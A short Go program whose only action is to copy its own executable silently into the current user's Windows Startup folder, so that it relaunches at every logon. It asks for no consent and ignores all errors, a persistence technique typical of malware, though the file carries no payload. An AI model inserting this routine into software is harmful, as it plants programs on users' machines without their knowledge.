package main

import (
	"io"
	"os"
	"path/filepath"
)

func main() {
	copyToStartup()
	
}
func copyToStartup() {
	exe, _:= os.Executable()
	home, _ := os.UserHomeDir()
	startup := home+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+filepath.Base(exe)
	input, _:= os.Open(exe)
	output, _ := os.Create(startup)
	defer input.Close()
	defer output.Close()
	io.Copy(output, input)
}